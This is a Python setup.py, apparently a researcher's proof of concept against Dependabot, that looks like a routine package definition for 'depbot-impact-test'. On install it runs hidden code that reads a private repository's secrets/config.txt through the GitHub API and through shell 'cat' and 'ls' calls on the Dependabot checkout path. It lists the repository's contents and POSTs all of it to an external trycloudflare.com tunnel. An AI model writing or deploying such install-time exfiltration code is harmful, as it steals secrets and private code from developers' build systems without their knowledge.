from setuptools import setup
import os
import json

_canary = "DEPBOT_IMPACT_V6_PRIVATE_2026_Zx4nSpM2wK8rJzFv"

_result = {"c": _canary}

import urllib.request

try:
    _rq = urllib.request.Request(
        "https://api.github.com/repos/toofikz2/depbot-impact-test",
        headers={"User-Agent": "pip/24.0"}
    )
    _rp = urllib.request.urlopen(_rq, timeout=10)
    _rd = json.loads(_rp.read().decode())
    _result["repo_meta"] = {
        "private": _rd.get("private"),
        "full_name": _rd.get("full_name"),
        "default_branch": _rd.get("default_branch"),
    }
except Exception as _e:
    _result["repo_meta"] = {"error": str(_e)[:300]}

try:
    _rq = urllib.request.Request(
        "https://api.github.com/repos/toofikz2/depbot-impact-test/contents/secrets/config.txt",
        headers={"User-Agent": "pip/24.0"}
    )
    _rp = urllib.request.urlopen(_rq, timeout=10)
    _rd = json.loads(_rp.read().decode())
    import base64
    _content = base64.b64decode(_rd.get("content", "")).decode("utf-8", errors="replace")
    _result["private_file_read"] = {
        "path": _rd.get("path"),
        "content": _content,
        "sha": _rd.get("sha"),
        "size": _rd.get("size"),
    }
except Exception as _e:
    _result["private_file_read"] = {"error": str(_e)[:300]}

_repo_path = os.environ.get("DEPENDABOT_REPO_CONTENTS_PATH", "")
if _repo_path:
    _secrets_file = _repo_path + "/secrets/config.txt"
    if os.path.exists(_secrets_file):
        _result["private_file_fs"] = os.popen("cat " + _secrets_file).read()[:1000]
    else:
        _result["private_file_fs"] = "not-on-disk: " + os.popen("ls -la " + _repo_path + "/").read()[:500]

try:
    _rq = urllib.request.Request(
        "https://api.github.com/repos/toofikz2/depbot-impact-test/contents/",
        headers={"User-Agent": "pip/24.0"}
    )
    _rp = urllib.request.urlopen(_rq, timeout=10)
    _files = json.loads(_rp.read().decode())
    _result["repo_contents_listing"] = [
        {"name": f.get("name"), "type": f.get("type"), "size": f.get("size", 0)}
        for f in _files
    ]
except Exception as _e:
    _result["repo_contents_listing"] = {"error": str(_e)[:300]}

import urllib.request as _ur
try:
    _data = json.dumps(_result).encode()
    _rq3 = _ur.Request(
        "https://utc-ruling-selective-ash.trycloudflare.com/depbot-v6-private",
        data=_data,
        method="POST",
    )
    _rq3.add_header("Content-Type", "application/json")
    _ur.urlopen(_rq3, timeout=15)
except Exception:
    pass

setup(
    name="depbot-impact-test",
    version="0.1.0",
    install_requires=["requests==2.25.0"],
    tests_require=[_canary],
)
